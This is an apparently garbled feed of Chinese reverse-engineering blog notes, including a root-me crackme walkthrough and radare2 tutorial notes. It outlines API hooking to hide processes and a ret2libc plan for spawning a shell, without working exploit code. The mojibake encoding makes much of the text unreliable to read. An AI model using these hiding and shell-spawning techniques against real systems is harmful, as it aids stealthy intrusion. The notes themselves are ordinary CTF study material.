æœç´¢æ—¶ï¼Œå…ˆé€‰å–å¯¹çš„æ¨¡å—ã€‚å³é”®-select moudle</strong><br>åœ¨ç”¨ollydbg ä¸­<code>search for name</code>å‘½ä»¤</p><hr><h3 id="APIä»£ç ä¿®æ”¹"><a href="#APIä»£ç ä¿®æ”¹" class="headerlink" title="APIä»£ç ä¿®æ”¹"></a>APIä»£ç ä¿®æ”¹</h3><p>å°†APIå¤´äº”ä¸ªå­—èŠ‚ ä¿®æ”¹ ä¸ºJMP XXXXXXXX<br>å³è·³è½¬åˆ°æ³¨å…¥çš„å‡½æ•°ä¸­</p><p>é€šè¿‡å°†ntdll.ZwQuerySystemInformation() å‡½æ•°å½¢æˆçš„é“¾è¡¨ä¸­åˆ é™¤è¿›ç¨‹ä¿¡æ¯å³å¯åšåˆ°éšè—ç›¸å…³è¿›ç¨‹ã€‚</p><h3 id="å…¨å±€APIé’©å–"><a href="#å…¨å±€APIé’©å–" class="headerlink" title="å…¨å±€APIé’©å–"></a>å…¨å±€APIé’©å–</h3><p>é€šè¿‡ä¿®æ”¹ntdll.ZwResumeThread() API</p><h3 id="çƒ­è¡¥ä¸-hot-patch"><a href="#çƒ­è¡¥ä¸-hot-patch" class="headerlink" title="çƒ­è¡¥ä¸ hot patch"></a>çƒ­è¡¥ä¸ hot patch</h3><p>ä¿®æ”¹7å­—èŠ‚ä»£ç <br>1.äºŒæ¬¡è·³è½¬<br>ä¸¤å­—èŠ‚è·³åˆ°æŒ‡ä»¤ä¸Šé¢ï¼Œç”¨äº”å­—èŠ‚è·³åˆ°è‡ªå·±çš„å‡½æ•°åœ°å€<br>2.ä¸ç”¨è„±é’©ï¼Œåœ°å€+2å­—èŠ‚ï¼Œå°±å¯æ­£å¸¸è¿è¡Œ</p><p>ia-32 E9 è¡¨ç¤ºfar jmp äº”å­—èŠ‚ã€‚<br><code>E9 XXXXXXXX=è¦è·³è½¬çš„åœ°å€-å½“å‰æŒ‡ä»¤åœ°å€-å½“å‰æŒ‡ä»¤é•¿åº¦ï¼ˆ5ï¼‰</code></p><p>EB è¡¨ç¤º short jmp ä¸¤å­—èŠ‚<br>ä¾æ‰˜å½“å‰EIP åœ¨-128~127èŒƒå›´é—´è·³è½¬<br><code>XX=è¦è·³è½¬çš„åœ°å€-å½“å‰æŒ‡ä»¤åœ°å€-å½“å‰æŒ‡ä»¤é•¿åº¦ï¼ˆ2ï¼‰</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;INT-å’Œ-IAT&quot;&gt;&lt;a href=&quot;#INT-å’Œ-IAT&quot; class=&quot;headerlink&quot; title=&quot;INT å’Œ IAT&quot;&gt;&lt;/a&gt;INT å’Œ IAT&lt;/h3&gt;&lt;p&gt;INT  æ˜¯rvaæ•°ç»„ï¼ŒINTè¡¨ç¤ºæ•°ç»„é¦–åœ°å€ æ•°ç»„å…ƒç´ æ˜¯ä¸€ä¸ªåœ°å€ æŒ‡å‘ç”±ä¸€ä¸ª2å­—èŠ‚ordinallåœ°å€å’Œå‡½æ•°åç§°ç»„æˆçš„ç»“æ„ä½“  ç¬¬ä¸€ä¸ªå€¼åœ°å€æŒ‡å‘ç¬¬ä¸€ä¸ªç»“æ„ä½“&lt;/p&gt;
&lt;p&gt;å¦‚æœIATå­˜åœ¨äº é€‰æ‹©å¤´ä¸­IATè¡¨æ˜çš„åœ°å€ä¸­ ç›¸åº”æ²¡æœ‰å†™æƒé™ä¹Ÿæ²¡äº‹&lt;/p&gt;
&lt;p&gt;INTå’ŒIATæŒ‡å‘å†…å®¹æœ‰æ—¶ç›¸åŒ è¡¨ç¤ºåœ°å€è‚¯å®šä¸åŒ å› ä¸ºä¿å­˜åœ¨ä¸åŒåœ°å€ æ‰€æŒ‡å†…å®¹ç›¸åŒ&lt;/p&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ch25.bin</title>
    <link href="http://finsenty54.github.io/2020/10/05/ch25bin/"/>
    <id>http://finsenty54.github.io/2020/10/05/ch25bin/</id>
    <published>2020-10-05T11:13:34.000Z</published>
    <updated>2020-10-05T11:14:23.029Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é€†å‘-root-me"><a href="#é€†å‘-root-me" class="headerlink" title="é€†å‘ root_me"></a>é€†å‘ root_me</h2><h3 id="ch25-bin"><a href="#ch25-bin" class="headerlink" title="ch25.bin"></a>ch25.bin</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en</a><br><a id="more"></a></p><h4 id="è¯†åˆ«C-ç±»"><a href="#è¯†åˆ«C-ç±»" class="headerlink" title="è¯†åˆ«C++ç±»"></a>è¯†åˆ«C++ç±»</h4><p>å¦‚ä½•è¯†åˆ«è½¯ä»¶æ˜¯ç”¨C++æ‰€å†™ï¼Ÿ<br>1 é¢‘ç¹ä½¿ç”¨ECX ä¿å­˜this æŒ‡é’ˆ ï¼ŒæŒ‡å‘ç±»å¯¹è±¡ï¼Œå¦‚åœ¨è°ƒç”¨å‡½æ•°å‰<br>2 è™šå‡½æ•° è¦å…ˆçŸ¥é“ç±»è™šå‡½æ•°è¡¨ï¼Œç„¶åå¾—åˆ°å®é™…å€¼ï¼Œä¹Ÿæ˜¯ä¼ åˆ°ECXä¸­<br>3 ä½¿ç”¨STL code å¯ç”¨IDA importsæŸ¥çœ‹</p><h4 id="ç±»æ€ä¹ˆåœ¨å†…å­˜ä¸­å­˜å‚¨"><a href="#ç±»æ€ä¹ˆåœ¨å†…å­˜ä¸­å­˜å‚¨" class="headerlink" title="ç±»æ€ä¹ˆåœ¨å†…å­˜ä¸­å­˜å‚¨"></a>ç±»æ€ä¹ˆåœ¨å†…å­˜ä¸­å­˜å‚¨</h4><p>æ¯ä¸ªå˜é‡å››å­—èŠ‚<br>ä¸è¶³è¦å¯¹é½<br>å†…å­˜ä¸­æ’åˆ—ä¸å®šä¹‰ç›¸åŒ</p><hr><p>è™šå‡½æ•°è¡¨è¦åœ¨æœ€å¼€å¤´<br>è¡¨åŒ…å«è™šå‡½æ•°åœ°å€ï¼ŒæŒ‰å®šä¹‰æ’åº</p><p><strong>å¦‚æœç»§æ‰¿å¦ä¸€ä¸ªç±»</strong></p><p>ç»§æ‰¿å¤šä¸ªç±»<br><strong>è™šè¡¨æŒ‰é¡ºåºæ’åº</strong></p><hr><h4 id="è¯†åˆ«ç±»"><a href="#è¯†åˆ«ç±»" class="headerlink" title="è¯†åˆ«ç±»"></a>è¯†åˆ«ç±»</h4><h5 id="1-è¯†åˆ«æ„å»ºå’Œæ’¤é”€"><a href="#1-è¯†åˆ«æ„å»ºå’Œæ’¤é”€" class="headerlink" title="1 è¯†åˆ«æ„å»ºå’Œæ’¤é”€"></a>1 è¯†åˆ«æ„å»ºå’Œæ’¤é”€</h5><h6 id="1-1-å…¨å±€å˜é‡"><a href="#1-1-å…¨å±€å˜é‡" class="headerlink" title="1.1 å…¨å±€å˜é‡"></a>1.1 å…¨å±€å˜é‡</h6><p>åœ¨ç¼–è¯‘æ—¶ ä¿å­˜åˆ°ï¼ˆPEï¼‰æ–‡ä»¶çš„æ•°æ®æ®µ<br>æ„å»ºåœ¨main()å‰è°ƒç”¨</p><h6 id="ç”¨thisè°ƒç”¨å…¨å±€å˜é‡ï¼Œåœ¨EPå’Œmain-é—´ï¼Œç¡®å®šä¸ºæ„å»º"><a href="#ç”¨thisè°ƒç”¨å…¨å±€å˜é‡ï¼Œåœ¨EPå’Œmain-é—´ï¼Œç¡®å®šä¸ºæ„å»º" class="headerlink" title="ç”¨thisè°ƒç”¨å…¨å±€å˜é‡ï¼Œåœ¨EPå’Œmain()é—´ï¼Œç¡®å®šä¸ºæ„å»º"></a>ç”¨thisè°ƒç”¨å…¨å±€å˜é‡ï¼Œåœ¨EPå’Œmain()é—´ï¼Œç¡®å®šä¸ºæ„å»º</h6><p>1.2å±€éƒ¨å˜é‡<br>æŒ‡é’ˆæŒ‡å‘æœªåˆå§‹åŒ–çš„æ ˆå˜é‡</p><h6 id="1-3åŠ¨æ€åˆ†é…å˜é‡-new-ï¼‰"><a href="#1-3åŠ¨æ€åˆ†é…å˜é‡-new-ï¼‰" class="headerlink" title="1.3åŠ¨æ€åˆ†é…å˜é‡ new(ï¼‰"></a>1.3åŠ¨æ€åˆ†é…å˜é‡ new(ï¼‰</h6><p>å †ä¸Šåˆ†é…</p><h5 id="2å¤šæ€ç±»è¯†åˆ«"><a href="#2å¤šæ€ç±»è¯†åˆ«" class="headerlink" title="2å¤šæ€ç±»è¯†åˆ«"></a>2å¤šæ€ç±»è¯†åˆ«</h5><h6 id="2-1é‰´åˆ«å¤šæ€é€šè¿‡RTTIï¼Œå…¶å¯ä»¥è®©å¯¹è±¡åœ¨è¿è¡Œæ—¶ç¡®å®šç±»å‹ã€‚"><a href="#2-1é‰´åˆ«å¤šæ€é€šè¿‡RTTIï¼Œå…¶å¯ä»¥è®©å¯¹è±¡åœ¨è¿è¡Œæ—¶ç¡®å®šç±»å‹ã€‚" class="headerlink" title="2.1é‰´åˆ«å¤šæ€é€šè¿‡RTTIï¼Œå…¶å¯ä»¥è®©å¯¹è±¡åœ¨è¿è¡Œæ—¶ç¡®å®šç±»å‹ã€‚"></a>2.1é‰´åˆ«å¤šæ€é€šè¿‡RTTIï¼Œå…¶å¯ä»¥è®©å¯¹è±¡åœ¨è¿è¡Œæ—¶ç¡®å®šç±»å‹ã€‚</h6><p>RTTICompleteObjectLocator pointer</p><hr><p>TypeDescriptor<br>æŒ‡å‘çš„ç»“æ„åŒ…å«ç±»å</p><hr><p>RTTIClassHierarchyDescriptor</p><hr><p>RTTIBaseClassDescriptor</p><hr><p>vftable<br>vbtable (virtual base class table)</p><hr><h3 id="æŒ‡ä»¤E9"><a href="#æŒ‡ä»¤E9" class="headerlink" title="æŒ‡ä»¤E9"></a>æŒ‡ä»¤<code>E9</code></h3><p>æŒ‡ä»¤<code>E9</code>ç›¸å¯¹å¯»å€<br>e9 xxxxxxxx<br><code>xxxxxxxx=è¦è·³è½¬çš„åœ°å€-å½“å‰æŒ‡ä»¤åœ°å€-å½“å‰æŒ‡ä»¤é•¿åº¦ï¼ˆ5ï¼‰</code><br>e9 00 00 00 00  å³è·³è½¬åˆ°ä¸‹ä¸€ä¸ªåœ°å€<br>402005-402000-5=000000</p><h3 id="æŒ‡ä»¤EB"><a href="#æŒ‡ä»¤EB" class="headerlink" title="æŒ‡ä»¤EB"></a>æŒ‡ä»¤<code>EB</code></h3><p><code>EB</code>è¡¨ç¤ºshort jmpå‘½ä»¤ï¼Œè¿›è¡ŒçŸ­è·ç¦»è·³è½¬<br>eb xx</p><hr><h3 id="æŒ‡ä»¤setne"><a href="#æŒ‡ä»¤setne" class="headerlink" title="æŒ‡ä»¤setne"></a>æŒ‡ä»¤setne</h3><p><strong>set  if  not  equal</strong><br>setne cl<br>if ZF=1 then cl=0<br>if ZF=0 then cl=1</p><p>strings å‘½ä»¤<br>display printable strings in [file(s)] (stdin by default)</p><hr><h3 id="ç ´è§£æ–¹æ³•1"><a href="#ç ´è§£æ–¹æ³•1" class="headerlink" title="ç ´è§£æ–¹æ³•1"></a>ç ´è§£æ–¹æ³•1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./ch25.bin </span><br><span class="line">(gdb) <span class="built_in">set</span> args toto <span class="comment">//è®¾ç½®è¾“å…¥å‚æ•°toto</span></span><br><span class="line">(gdb) b main <span class="comment">//åœ¨mainè®¾ç½®æ–­ç‚¹</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x8048a95</span> </span><br><span class="line">(gdb) r  <span class="comment">//è¿è¡Œç¨‹åºï¼ˆåˆ°æ–­ç‚¹ï¼‰</span></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x08048a95</span> <span class="function">in <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span>disass <span class="comment">//æ˜¾ç¤ºæ±‡ç¼–ä»£ç </span></span></span><br><span class="line">(gdb) b *main+268</span><br><span class="line">gdb)c ç»§ç»­æ‰§è¡Œ</span><br><span class="line">(gdb) layout prev å¯ä»¥æŸ¥çœ‹å †æ ˆå’Œæ±‡ç¼–ä»£ç </span><br><span class="line">(gdb) x/<span class="number">1</span>xw $eax</span><br><span class="line">â€œ x / <span class="number">1</span>xw $ eaxå‘½ä»¤åœ¨EAXå¯„å­˜å™¨ä¸­åŒ…å«çš„åœ°å€å¤„æ˜¾ç¤º<span class="number">1</span>ä¸ªåå…­è¿›åˆ¶æ ¼å¼çš„<span class="number">16</span>ä½å­—</span><br><span class="line">(gdb) x/<span class="number">1</span>s <span class="number">0X08050b24</span></span><br><span class="line">æŸ¥çœ‹è¯¥åœ°å€å€¼</span><br></pre></td></tr></table></figure><h3 id="ç ´è§£æ–¹æ³•2"><a href="#ç ´è§£æ–¹æ³•2" class="headerlink" title="ç ´è§£æ–¹æ³•2"></a>ç ´è§£æ–¹æ³•2</h3><p><code>radare2</code> ç±»ä¼¼IDA<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r2 ch25.bin</span><br><span class="line">aaa <span class="comment">//åˆ†æå‡½æ•°ï¼Œå‚æ•°...</span></span><br><span class="line">VV @main <span class="comment">//ä½¿ç”¨ VV è¿›å…¥ å›¾å½¢åŒ–æ¨¡å¼ï¼ˆéœ€è¦æ˜¯å‡½æ•°èŒƒå›´å†…ï¼‰ã€‚</span></span><br><span class="line">pdf @ main <span class="comment">//åˆ†æåå°±å¯ä»¥æ­£å¸¸æ‰“å°å‡½æ•°ä»£ç äº†ï¼ˆpdf æ‰“å°å‡½æ•°ä»£ç ï¼‰</span></span><br></pre></td></tr></table></figure></p><p>pedaæ˜¯GDBçš„ä¸€ä¸ªæ’ä»¶<br><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p><p>gdb-peda$ run jlkd å¸¦å‚æ•°è¿è¡Œ</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;é€†å‘-root-me&quot;&gt;&lt;a href=&quot;#é€†å‘-root-me&quot; class=&quot;headerlink&quot; title=&quot;é€†å‘ root_me&quot;&gt;&lt;/a&gt;é€†å‘ root_me&lt;/h2&gt;&lt;h3 id=&quot;ch25-bin&quot;&gt;&lt;a href=&quot;#ch25-bin&quot; class=&quot;headerlink&quot; title=&quot;ch25.bin&quot;&gt;&lt;/a&gt;ch25.bin&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>é€†å‘ å­¦ä¹ r2 part2</title>
    <link href="http://finsenty54.github.io/2020/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0r2part2/"/>
    <id>http://finsenty54.github.io/2020/09/27/é€†å‘å­¦ä¹ r2part2/</id>
    <published>2020-09-27T11:19:49.000Z</published>
    <updated>2020-09-27T11:20:33.245Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é€†å‘-å­¦ä¹ r2-part2"><a href="#é€†å‘-å­¦ä¹ r2-part2" class="headerlink" title="é€†å‘ å­¦ä¹ r2 part2"></a>é€†å‘ å­¦ä¹ r2 part2</h2><p><a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/" target="_blank" rel="noopener">https://www.megabeets.net/a-journey-into-radare-2-part-2/</a></p><p>åœ¨NXå’ŒASLRçš„ä¿æŠ¤ä¸‹</p><hr><a id="more"></a><p><code>$ r2 -d megabeets_0x2</code><br><code>-d</code> â€“ Open in the debug mode<br>aas â€“ Analyze functions, symbols and more</p><p><code>dcu address      Continue until address</code></p><p><code>VV</code></p><p><code>pdf @ sym.beet</code></p><hr><h3 id="ragg2"><a href="#ragg2" class="headerlink" title="ragg2"></a>ragg2</h3><p><code>ragg2</code>, which allows us to generate a cyclic pattern called De Bruijn Sequence and check the exact offset where our payload overrides the buffer.<br>å®ƒå…è®¸æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªç§°ä¸ºDe Bruijn Sequenceçš„å¾ªç¯æ¨¡å¼ï¼Œå¹¶æ£€æŸ¥æœ‰æ•ˆè½½è·è¦†ç›–ç¼“å†²åŒºçš„ç¡®åˆ‡åç§»é‡</p><pre><code>-P [size]       prepend debruijn pattern -q [fragment]   debruijn pattern offset -r              show raw bytes instead of hexpairs</code></pre><p><code>$ ragg2 -P 100 -r</code><br><em>ä¹‹å‰SEHæ”»å‡» åº”è¯¥æœ‰ç”¨è¿‡</em></p><hr><h3 id="rarun2"><a href="#rarun2" class="headerlink" title="rarun2"></a>rarun2</h3><p><code>rarun2</code>ç”¨ä½œå¯åŠ¨å™¨ï¼Œç”¨äºè¿è¡Œå…·æœ‰ä¸åŒç¯å¢ƒï¼Œå‚æ•°ï¼Œæƒé™ï¼Œç›®å½•çš„ç¨‹åºï¼Œå¹¶è¦†ç›–é»˜è®¤æ–‡ä»¶æè¿°ç¬¦ï¼ˆä¾‹å¦‚stdinï¼‰ã€‚<br>å½“æ‚¨å¿…é¡»ä½¿ç”¨é•¿å‚æ•°è¿è¡Œç¨‹åºï¼Œå°†å¤§é‡æ•°æ®ä¼ é€’ç»™stdinæˆ–ç±»ä¼¼çš„ä¸œè¥¿æ—¶ï¼Œè¿™å¾ˆæœ‰ç”¨ï¼Œè¿™é€šå¸¸æ˜¯åˆ©ç”¨äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µã€‚</p><hr><pre><code>$ ragg2 -P 200 -r &gt; pattern.txt$ cat pattern.txt</code></pre><hr><pre><code>$ vim profile.rr2$ cat profile.rr2#!/usr/bin/rarun2stdin=./pattern.txt</code></pre><hr><p><code>$ r2 -r profile.rr2 -d megabeets_0x2</code><br>-r [rarun2]  specify rarun2 profile to load (same as -e dbg.profile=X)<br>-d           debug the executable â€˜fileâ€™ or running process â€˜pidâ€™</p><hr><p>ä¿¡å·æ˜¯å‘é€åˆ°åŒä¸€è¿›ç¨‹ä¸­çš„æŸä¸ªè¿›ç¨‹æˆ–ç‰¹å®šçº¿ç¨‹çš„å¼‚æ­¥é€šçŸ¥ï¼Œä»¥ä¾¿å°†å‘ç”Ÿçš„äº‹ä»¶é€šçŸ¥ç»™å®ƒã€‚<br>Â·å½“SIGSEGVï¼ˆ11ï¼‰ä¿¡å·åšå‡ºæ— æ•ˆçš„è™šæ‹Ÿå†…å­˜å¼•ç”¨æˆ–åˆ†æ®µé”™è¯¯æ—¶ï¼Œå³åœ¨æ‰§è¡Œåˆ†æ®µè¿è§„æ—¶ï¼Œå°†å…¶å‘é€åˆ°è¿›ç¨‹ã€‚</p><hr><p><code>wopO value</code>       Finds the given value into a De Bruijn Pattern at current offset</p><p>| dr                     Show â€˜gprâ€™ registers<br>wopO <code>dr eip</code><br>æ²¡æœ‰æˆåŠŸ<br>wopO 0x41417641</p><hr><p>i   Get info from opened file (see rabin2â€™s manpage)<br>ii                 Imports<br>iip æ›´ç®€æ˜</p><hr><p>The plan</p><ol><li>Leak the real address of puts</li><li>Calculate the base address of libc</li><li>Calculate the address of system</li><li>Find an address in libc that contains the string /bin/sh</li><li>Call system with /bin/sh and spawn a shell</li></ol><hr><p><code>è¿‡ç¨‹é“¾æ¥è¡¨Procedure Linkage Tableï¼ˆPLT)</code>æ˜¯ä¸€ä¸ªå†…å­˜ç»“æ„ï¼Œå…¶ä¸­åŒ…å«å¤–éƒ¨åŠŸèƒ½çš„ä»£ç å­˜æ ¹ï¼Œè¿™äº›å‡½æ•°çš„åœ°å€åœ¨é“¾æ¥æ—¶æ˜¯æœªçŸ¥çš„ã€‚<br>Â·æ¯å½“æˆ‘ä»¬åœ¨.textæ®µä¸­çœ‹åˆ°å¯¹å‡½æ•°çš„CALLæŒ‡ä»¤æ—¶ï¼Œéƒ½ä¸ä¼šç›´æ¥è°ƒç”¨è¯¥å‡½æ•°ã€‚<br>Â·ç›¸åï¼Œå®ƒåœ¨PLTå¤„è°ƒç”¨å­˜æ ¹ä»£ç ï¼Œä¾‹å¦‚<code>func_name @ plt</code>ã€‚<br>ç„¶åï¼Œå­˜æ ¹è·³è½¬åˆ°<code>å…¨å±€åç§»è¡¨ï¼ˆGOTï¼‰</code>ä¸­ä¸ºæ­¤åŠŸèƒ½åˆ—å‡ºçš„åœ°å€ã€‚<br>å¦‚æœå®ƒæ˜¯æ­¤åŠŸèƒ½çš„ç¬¬ä¸€ä¸ªCALLï¼Œåˆ™<code>GOTæ¡ç›®å°†æŒ‡å‘PLTï¼Œåè€…å°†è°ƒç”¨åŠ¨æ€é“¾æ¥å™¨ï¼Œè¯¥é“¾æ¥å™¨å°†è§£ææ‰€éœ€åŠŸèƒ½çš„å®é™…åœ°å€</code><br>ä¸‹æ¬¡è°ƒç”¨func_name @ pltæ—¶ï¼Œå­˜æ ¹ç›´æ¥ä»<code>GOTè·å–åŠŸèƒ½åœ°å€</code>ã€‚<br>((å°‘äº†åŠ¨æ€é“¾æ¥æ­¥éª¤ï¼Ÿï¼Ÿ))</p><hr><p><code>pwntools</code>æ¼æ´åˆ©ç”¨æ¡†æ¶</p><hr><pre><code>~ character is radareâ€™s internal grep[0xf7763b30]&gt; # the address of puts@plt:[0xf7763b30]&gt; ?v sym.imp.puts //Usage: ?v[id][ num]  # Show value0x08048390[0xf7763b30]&gt; ?v reloc.puts</code></pre><p><code>syæŒ‰tabé”®è‡ªåŠ¨æœå¯»</code></p><hr><pre><code>Usage: dmi    # List/Load SymbolsAll these paddr=0x000xxxxx are the offsets of the function from libc base. </code></pre><hr><p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨radareçš„æœç´¢åŠŸèƒ½ã€‚<br>Â·é»˜è®¤æƒ…å†µä¸‹ï¼Œradareæ­£åœ¨dbg.mapä¸­æœç´¢ï¼Œè¿™æ˜¯å½“å‰çš„å†…å­˜æ˜ å°„ã€‚<br>Â·æˆ‘ä»¬è¦æœç´¢æ‰€æœ‰å†…å­˜æ˜ å°„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯¹å…¶è¿›è¡Œé…ç½®ï¼š<br>[0x080483d0]&gt; e search.in = dbg.maps<br>è¦ä»¥å¯è§†æ–¹å¼é…ç½®é›·è¾¾ï¼Œè¯·ä½¿ç”¨Ve</p><hr><pre><code>Usage: /[!bf] [arg]  Search stuffdmm   List modules of target process[0x080483d0]&gt; ?X 0xf7700768-0xf7599000</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;é€†å‘-å­¦ä¹ r2-part2&quot;&gt;&lt;a href=&quot;#é€†å‘-å­¦ä¹ r2-part2&quot; class=&quot;headerlink&quot; title=&quot;é€†å‘ å­¦ä¹ r2 part2&quot;&gt;&lt;/a&gt;é€†å‘ å­¦ä¹ r2 part2&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.megabeets.net/a-journey-into-radare-2-part-2/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.megabeets.net/a-journey-into-radare-2-part-2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;åœ¨NXå’ŒASLRçš„ä¿æŠ¤ä¸‹&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>å­¦ä¹ r2</title>
    <link href="http://finsenty54.github.io/2020/09/24/%E5%AD%A6%E4%B9%A0r2/"/>
    <id>http://finsenty54.github.io/2020/09/24/å­¦ä¹ r2/</id>
    <published>2020-09-24T08:29:04.000Z</published>
    <updated>2020-09-24T08:30:03.440Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é€†å‘-å­¦ä¹ r2"><a href="#é€†å‘-å­¦ä¹ r2" class="headerlink" title="é€†å‘ å­¦ä¹ r2"></a>é€†å‘ å­¦ä¹ r2</h2><h3 id="RABIN2-â€”-Binary-program-info-extractor"><a href="#RABIN2-â€”-Binary-program-info-extractor" class="headerlink" title="RABIN2 â€” Binary program info extractor"></a>RABIN2 â€” Binary program info extractor</h3><pre><code>$ rabin2 -I megabeets_0x1</code></pre><p><code>stripped false</code><br>æ²¡æœ‰å‰¥ç¦»ç¬¦å·è¡¨<br><code>static   false</code> //æ‰€ä»¥æ˜¯åŠ¨æ€é“¾æ¥<br><a id="more"></a></p><h3 id="r2-radare2"><a href="#r2-radare2" class="headerlink" title="r2 //radare2"></a>r2 //radare2</h3><h4 id="ie"><a href="#ie" class="headerlink" title="ie"></a>ie</h4><pre><code>[0x08048370]&gt; ie</code></pre><p>ie å‘½ä»¤å¯ä»¥æ‰“å°å‡ºç¨‹åºçš„å…¥å£ç‚¹</p><hr><h4 id><a href="#" class="headerlink" title="?"></a>?</h4><p>åœ¨ä»»ä½•ä¸€ä¸ªå‘½ä»¤åé¢æ·»åŠ  ? æ¥è·å¾—æ›´å¤šçš„å­å‘½ä»¤ä¿¡æ¯ï¼š<br>    [0x08048370]&gt; i?</p><hr><h4 id="aa"><a href="#aa" class="headerlink" title="aa"></a>aa</h4><p>ä½¿ç”¨ â€˜aaâ€™ å‘½ä»¤æ¥åˆ†ææ–‡ä»¶</p><pre><code>[0x08048370]&gt; a?</code></pre><p>aa?<br>aaa[?]              autoname functions after aa (see afna)</p><hr><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>flag æ˜¯æ‰€æœ‰ç±»ä¼¼ç‰¹å¾çš„é›†åˆï¼Œå±•ç¤ºæ‰€æœ‰çš„ flag ï¼Œç”¨ â€˜fsâ€™ å‘½ä»¤<br>    [0x08048370]&gt; fs</p><h4 id="f"><a href="#f" class="headerlink" title="f"></a>f</h4><p> f         list flags (will only list flags from selected flagspaces<br>    [0x08048370]&gt; fs imports; f</p><hr><h4 id="iz"><a href="#iz" class="headerlink" title="iz"></a>iz</h4><p>iz â€“ åˆ—å‡ºæ•°æ®æ®µé‡Œçš„å­—ç¬¦ä¸²</p><hr><h4 id="axt"><a href="#axt" class="headerlink" title="axt"></a>axt</h4><pre><code>[0x08048370]&gt; axt @@ str.*</code></pre><p> axt [addr]      find data/code references to this address</p><p><code>@@                   # foreach iterator command:</code></p><hr><h4 id="x"><a href="#x" class="headerlink" title="x"></a>x</h4><p>| x @@ sym.*          run â€˜xâ€™ over all flags matching â€˜sym.â€™ in current flagspace</p><hr><h4 id="s"><a href="#s" class="headerlink" title="s"></a>s</h4><p>s    # Help for the seek commands. See ?$? to see all variables</p><hr><h4 id="afl"><a href="#afl" class="headerlink" title="afl"></a>afl</h4><p>af?<br>ç”¨ â€˜aflâ€™ æŒ‡ä»¤ï¼Œè¿™ä¸ªæŒ‡ä»¤ä»£è¡¨ç€åˆ†æå‡½æ•°åˆ—è¡¨ï¼ˆAnalyze Functions Listï¼‰.</p><hr><h4 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h4><p>s main<br>ç”¨ â€˜pdfâ€™ï¼ˆè¾“å‡ºåæ±‡ç¼–ä»£ç ï¼‰</p><hr><h4 id="m"><a href="#m" class="headerlink" title="m"></a>m</h4><p>m<key> å¯ä»¥ç”¨æ¥æ ‡è®°ç‰¹å®šçš„åç§»åœ°å€ï¼Œä¹‹åè¾“å…¥å¯¹åº”çš„keyå°±å¯ä»¥è·³è½¬åˆ°ä½ è®¾ç½®çš„åœ°æ–¹.</key></p><hr><h4 id="V"><a href="#V" class="headerlink" title="V"></a>V</h4><p>V è§†å›¾æ¨¡å¼<br>shell é‡Œè¾“å…¥ VVæ¥è¿›å…¥å›¾å½¢æ¨¡å¼</p><hr><p>f sym.<tab> æ¥å®šä½å‡º sym.beet å‡½æ•°<br>pdf @ sym.beet å‘½ä»¤ï¼Œâ€˜@â€™ è¡¨ç¤ºä¸´æ—¶æŸ¥æ‰¾<br>å¯è§†è§†å›¾ç•Œé¢ç›´æ¥è·³è½¬åˆ° beet å‡½æ•°<br>ä¸Šé¢è¯´è¿‡çš„æ–¹æ¡†ä¸­çš„æ•°å­—å—ï¼Ÿè¿™é‡Œç›´æ¥æŒ‰ 3 å°±å¯ä»¥äº†<br> gd å‘½ä»¤ï¼Œd å°±æ˜¯æ¯ä¸€ä¸ªè·³è½¬æˆ–è€…è°ƒç”¨ä»£ç æ—è¾¹çš„ å­—æ¯</tab></p><hr><h4 id="ahi"><a href="#ahi" class="headerlink" title="ahi"></a>ahi</h4><p>:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7<br>ahi s       set base to string (1)<br>ahi s 